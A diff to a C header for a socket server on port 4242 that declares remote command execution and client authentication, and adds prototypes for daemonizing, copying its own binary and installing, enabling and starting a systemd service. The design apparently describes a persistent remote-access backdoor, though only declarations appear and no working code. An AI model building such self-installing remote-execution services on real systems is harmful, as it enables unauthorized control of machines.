@@ -8,6 +8,7 @@
 #include <arpa/inet.h>
 #include <sys/select.h>
 #include <errno.h>
+#include <fcntl.h>
 
 #define PORT 4242
 #define BUFFER_SIZE 1024
@@ -22,4 +23,9 @@ void handle_client_data(int socket_id, char *buffer, struct sockaddr_in* address
 void execute_command(const char* command, int client_socket);
 int authenticate_client(int client_socket);
 void hash(const char *password, char *hash);
+void ensure_single_instance();
+void create_daemon();
+void copy_binary(const char* source_path, const char* dest_path);
+void create_systemd_service(const char* service_name, const char* binary_path);
+void enable_and_start_service(const char* service_name);
 #endif
